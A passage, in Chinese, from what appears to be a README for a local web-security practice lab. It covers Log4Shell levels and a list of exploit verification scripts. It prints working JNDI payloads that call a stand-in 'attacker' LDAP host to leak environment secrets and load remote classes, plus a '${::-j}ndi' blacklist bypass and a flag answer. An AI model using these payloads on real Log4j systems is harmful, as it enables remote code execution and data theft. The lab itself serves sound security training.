`${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}`。log4j 先算嵌套的 `${env:}` 再发 LDAP，
DN 里带上 flag，`curl http://127.0.0.1:19089/events` 可读到。不 RCE。

**L2 远程 codebase RCE** — `python3 log4shell/poc/02_rce.py` 发
`${jndi:ldap://attacker:1389/l2}`。JNDI 查到 `javaNamingReference`，去 19089 取
`L2.class`，目标 JVM 执行静态块读 `/flag_l2` 并 POST `/collect`。
**19080 必须带 `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`**——JDK 8u191 起默认
禁止远程 codebase，19081 保留了默认值专门做这个对照。

**L3 关键字绕过** — `python3 log4shell/poc/03_bypass.py` 用 `${::-j}ndi:...`
把 `jndi` 拼回来，绕过只匹配字面量的黑名单。`FLAG{log4shell_lookup_obfuscation_9c73}`。

**L4 加固对照** — 同样的 payload 打 19081（JDK 默认）只会有回连、不会加载远程类；
打 19082（2.17.1）连 lookup 都不再触发。**JDK 加固挡的是「远程类加载」这一步，
升级 log4j 才根治**。这是认知对照，没有 flag。

`python3 log4shell/poc/verify.py` 一键回归全部四关；逐层原理、踩坑与
错误结论反证在 `log4shell/Log4Shell-练习手册.md`。

---

## 十四、一键验证

各靶场自带纯标准库的验证脚本，环境起来后直接跑：

```bash
cd deserialization && python3 poc/php_exp.py all      # PHP L1~L4
cd deserialization && python3 poc/java_exp.py         # Java CC6
cd xxe && python3 poc/xxe_exp.py                      # XXE 五关
cd jwt && python3 poc/jwt_exp.py                      # JWT 四关
cd gopher/poc && python3 01_gopher_raw.py             # 六关按编号逐个跑
cd webshell-hunt && python3 hunt.py --docker webshell-hunt
cd sandbox-escape && python3 poc/verify.py             # 沙箱逃逸 L1~L4
cd shiro && python3 poc/shiro550_exp.py               # Shiro 550
cd shiro && python3 poc/shiro721_exp.py               # Shiro 721（约 1 分钟）
cd shiro && python3 poc/bypass_exp.py                 # 四个版本的绕过矩阵
cd replay-adcs && python3 poc/exp.py                   # 重放 + AD CS 五关
cd replay-adcs && python3 ntlm.py                     # 协议层自测
```

上面是根编排里的 11 个。下面三个是独立靶场，**先按各自方式起环境**再跑：

```bash
./java-memshell/up.sh && python3 java-memshell/poc/run.py    # 内存马 L0~L4，需宿主 javac
cd kerberos && sh setup.sh && python3 poc/solve.py            # 黄金 / 白银票据六关
./log4shell/up.sh && python3 log4shell/poc/verify.py          # Log4Shell 四关
```

都没有第三方依赖，`urllib` + `socket` + `hmac` 手写。
**建议先自己调通再看脚本**——这些脚本是答案，不是教程。

XXE 的 L2 和 Gopher 的 L5/L6 依赖 `host.docker.internal` 回连宿主机，
容器要能访问宿主机的随机高位端口。macOS / Windows 的 Docker Desktop 默认支持；
Linux 上需要给容器加 `--add-host=host.docker.internal:host-gateway`，
或用 `OOB_HOST` 环境变量改成宿主机的局域网 IP。
